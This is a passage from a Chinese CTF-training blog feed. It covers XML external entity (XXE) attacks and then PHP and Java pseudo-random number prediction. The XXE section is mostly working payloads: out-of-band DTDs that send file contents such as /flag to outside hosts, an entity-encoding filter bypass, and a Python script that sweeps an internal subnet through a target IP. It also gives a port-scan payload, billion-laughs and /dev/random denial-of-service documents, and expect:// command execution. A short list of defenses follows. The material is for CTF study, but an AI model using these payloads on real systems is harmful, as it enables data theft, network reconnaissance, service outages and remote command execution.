class="hljs-meta-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml">%dtd; ]&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">roottag</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">roottag</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml">本地测试：</span><br><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">start</span> <span class="hljs-meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///d:/1.txt&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">end</span> <span class="hljs-meta-string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///d:/a.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml">%dtd; ]&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">all</span> <span class="hljs-meta-string">&quot;%start;%file;%end;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211205153830896.png"></p><ul><li>服务端无回显</li></ul><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">convert</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%remote;%int;%send;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml">]&gt;</span></span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">int</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://ip:2333?p=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></blockquote><p>SVG 格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE note [<br>&lt;!ENTITY file SYSTEM &quot;要读取的文件路径&quot; &gt;<br>]&gt;<br>&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;<br>  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;<br>&lt;/svg&gt;<br></code></pre></td></tr></table></figure><p>数据外带</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;!DOCTYPE root [<br>&lt;!ENTITY % remote SYSTEM &quot;http://174.1.66.167/shell.dtd&quot;&gt;<br>%remote;<br>]&gt;<br><br>shell.dtd<br>&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://i/?flag=%file;&#x27;&gt;&quot;&gt;<br>%int;<br>%send;<br></code></pre></td></tr></table></figure><p>xxe 绕过的 payload</p><p>当只过滤了 SYSTEM，PUBLIC 等关键字时，可用双重实体编码绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?XML version=&quot;1.0&quot;?&gt;<br><br>&lt;!DOCTYPE GVI [<br><br>    &lt;!ENTITY % XML &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt;<br><br>    %XML;<br></code></pre></td></tr></table></figure><p>即为在 XML 实体中再定义一次 XML，可成功被解析，支持 dtd 数据外带</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;<br>&lt;core&gt;<br>      &lt;message&gt;&amp;xxe;&lt;/message&gt;<br>&lt;/core&gt;<br></code></pre></td></tr></table></figure><h2 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h2><p>主机发现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment">#Origtional XML that the server accepts</span><br><span class="hljs-comment">#&lt;xml&gt;</span><br><span class="hljs-comment">#    &lt;stuff&gt;user&lt;/stuff&gt;</span><br><span class="hljs-comment">#&lt;/xml&gt;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_xml</span>(<span class="hljs-params">string</span>):</span><br>    xml = <span class="hljs-string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="hljs-string">&#x27;&quot;&#x27;</span> + string + <span class="hljs-string">&#x27;&quot;&#x27;</span> + <span class="hljs-string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br>    send_xml(xml)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_xml</span>(<span class="hljs-params">xml</span>):</span><br>    headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/xml&#x27;</span>&#125;<br>    x = requests.post(<span class="hljs-string">&#x27;http://34.200.157.128/CUSTOM/NEW_XEE.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="hljs-number">5</span>).text<br>    coded_string = x.split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">2</span>] <span class="hljs-comment"># a little split to get only the base64 encoded value</span><br>    <span class="hljs-built_in">print</span> coded_string<br><span class="hljs-comment">#   print base64.b64decode(coded_string)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">255</span>):<br>    <span class="hljs-keyword">try</span>:<br>        i = <span class="hljs-built_in">str</span>(i)<br>        ip = <span class="hljs-string">&#x27;10.0.0.&#x27;</span> + i<br>        string = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="hljs-string">&#x27;/&#x27;</span><br>        <span class="hljs-built_in">print</span> string<br>        build_xml(string)<br>    <span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>端口扫描</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">data</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://127.0.0.1:i/&quot;</span> [</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><p>爆破 i</p><h2 id="DOS-攻击"><a href="#DOS-攻击" class="headerlink" title="DOS 攻击"></a>DOS 攻击</h2><p>产生 3G 左右的垃圾文档，使服务器宕机</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-params">&lt;?xml version=&quot;<span class="hljs-number">1.0</span>&quot;?&gt;</span><br>     <span class="hljs-params">&lt;!DOCTYPE lolz [</span><br><span class="hljs-params">     &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol2 &quot;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol3 &quot;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol4 &quot;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol5 &quot;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol6 &quot;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol7 &quot;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol8 &quot;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;<span class="hljs-variable">&amp;lol7</span>;&quot;&gt;</span><br>     <span class="hljs-params">&lt;!ENTITY lol9 &quot;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;&quot;&gt;</span><br>     ]&gt;<br>     <span class="hljs-params">&lt;lolz&gt;</span><span class="hljs-variable">&amp;lol9</span>;<span class="hljs-params">&lt;/lolz&gt;</span><br></code></pre></td></tr></table></figure><p>在 Unix 中，使用/dev/random 文件内容代替实体，则用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///dev/random&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="PHP-RCE"><a href="#PHP-RCE" class="headerlink" title="PHP RCE"></a>PHP RCE</h2><p>在开启了 expect 扩展的情况下，可以执行系统命令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root</span> [ <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;expect://whoami&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h1><p>1.禁用外部实体</p><blockquote><p>libxml_disable_entity_loader(true)</p></blockquote><p>2.过滤非法输入</p><p>匹配关键字<code>&lt;!DOCTYPE &lt;!ENTITY SYSTEM PUBLIC</code></p><p>3.禁止外部实体的解析</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>伪随机数</title>
    <link href="/2021/11/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%88%86%E6%9E%90/"/>
    <url>/2021/11/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><blockquote><p>mt_scrand()//播种 Mersenne Twister 随机数生成器</p><p>mt_rand()//生成随机数</p></blockquote><p>mt_scrand()通过 seed 分发种子，通过 mt_rand()生成伪随机数</p><p>从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed 参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114013004978.png"></p><p>当种子不变时，生成的随机数是不变的，这就是伪随机数的漏洞所在</p><p>ctfshow25</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    mt_srand(hexdec(substr(md5(<span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>,<span class="hljs-number">8</span>)));<br>    <span class="hljs-variable">$rand</span> = intval(<span class="hljs-variable">$r</span>)-intval(mt_rand());<br>    <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$rand</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$rand</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&#x27;cat /proc/version&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>首先我们要获得第一个随机数，根据条件，传入 r=0；使用工具对得到的第一个随机数进行逆推，<a href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a></p><p>得到<strong>两个可能</strong>的随机数种子，即值<code>hexdec(substr(md5($flag), 0,8))</code></p><p>当<code>$_COOKIE[&#39;token&#39;]==(mt_rand()+mt_rand())</code>时得到 flag，由于前面已经执行了一次<code>mt_rand()</code>，我们需要得到后面两次的<code>mt_rand()</code>相加</p><p>编写脚本，对两个种子进行尝试，即得到两个<code>mt\_rand()+mt\_rand()</code>进行尝试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_scand(得到的种子值);<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand()+mt_rand();<br></code></pre></td></tr></table></figure><p>r=从页面得到的第一个随机数值 Cooke:token=脚本得到的两个随机数值相加</p><p>纵观整体难度不大，主要理解漏洞原理，以及题目使用的是后面两个随机值的相加</p><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><p>强伪随机数 RNG 实现<code>java.security.SecureRandom</code>类，该类使用临时文件夹中大小，线程休眠时间等的值作为随机数种子；而弱伪随机数实现 PRNG<code>java.util.Random</code>类，默认使用当前时间作为种子，并且采用线性同余法计算下一个随机数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> learn;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">World</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Random r1 = <span class="hljs-keyword">new</span> Random(<span class="hljs-number">1</span>);<br>        System.out.println(<span class="hljs-string">&quot;r1.nextINT(12)=&quot;</span> + r1.nextInt(<span class="hljs-number">12</span>));<br><br>        Random r2 = <span class="hljs-keyword">new</span> Random(<span class="hljs-number">1</span>);<br>        System.out.println(<span class="hljs-string">&quot;r2.nextINT(12)=&quot;</span> + r2.nextInt(<span class="hljs-number">12</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到</p><blockquote><p>r1.nextINT(12)=5<br>r2.nextINT(12)=5</p></blockquote><p>无论执行多少次，结果都不会改变，Random 生成的随机数是伪随机数，这就可以预测<code>java.util.Random</code>。调用<code>random.nextInt</code>生成三个连续的随机数，根据前两个随机数就可以预测第三个随机数。这里我们跟一下源代码<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114164615749.png"></p><p>调用 next 方法，如果 bound 是非正，抛出异常</p><p>传参 31，<code>bound&amp;m)==0</code>判断 bound 是否为 2 的 x 次方，如果是，则 r 值取<code>(int)((bound * (long)r) &gt;&gt; 31)</code>，next(31)传了什么值？跟进 next<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114165211667.png"></p><p>Random.class 有三个常量</p><blockquote><p>private static final long multiplier = 0x5DEECE66DL;//进制是 25214903917</p><p>private static final long addend = 0xBL;//十进制是 11</p><p>private static final long mask = (1L &lt;&lt; 48) - 1;//十进制是 281474976710655，十六进制是 0xffffffffffff</p></blockquote><p>构造方法</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211114202701125.png"></p><blockquote><p>oldseed 是(0x2F^0x5DEECE66D)&amp;0xffffffffffff 的值 0x5DEECE642， nextseed 为（oldseed*0x5DEECE66D+0xB）&amp; 0xffffffffffff 的值 0xBA2442955625，seed.compareAndSet(oldseed, nextseed)判断 nextseed 是否为预期的结果， 如果是预期结果返回 0xBA2442955625 &gt;&gt;&gt; (48 - 31)为 0x5D12214A；因此 next(31)为 0x5D12214A(十进制为 1561469258)</p></blockquote><p>就是说随机数种子 oldseed 和后一个随机数种子 nextseed 都被定义为 long 类型，返回为下一个种子右移 48-31=17 位后强制转换 int 的结果</p><p>while 里的 compareAndSet 方法比较当前种子是否为 oldseed，如果是的话就</p><p>更新为 nextseed，一般都会返回 true，下一个种子的更新算法在 do…while 结构里面，<code>nextseed=(oldseed * multiplier + addend) &amp; mask</code></p><p>//java.util.Random <a href="https://bbs.csdn.net/topics/390855511">https://bbs.csdn.net/topics/390855511</a></p><p>//AtomicLong<a href="https://blog.csdn.net/weixin_42146366/article/details/87820373">https://blog.csdn.net/weixin_42146366/article/details/87820373</a></p><ul><li>预测方法</li></ul><blockquote><p>如果把生成第一个随机数的种子定义为 seed1，seed2，seed3 往后顺延的话，seed1 右移 16 位就是第一个随机数的值，说明第一个随机数丢了 16 位，导致 seed1 就有 2 的 16 次方种可能。</p><p>把 2 的 16 次方种可能带入计算下一个 seed2，并且右移查看是否和第二个随机数的值相等就能确定是否正确的找到了 seed1。</p><p>如果前两个数是正数，但第三个数是负数，只需要对得到的补码再求一次补码即可，也就是取反后加 1。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2021/10/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2021/10/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
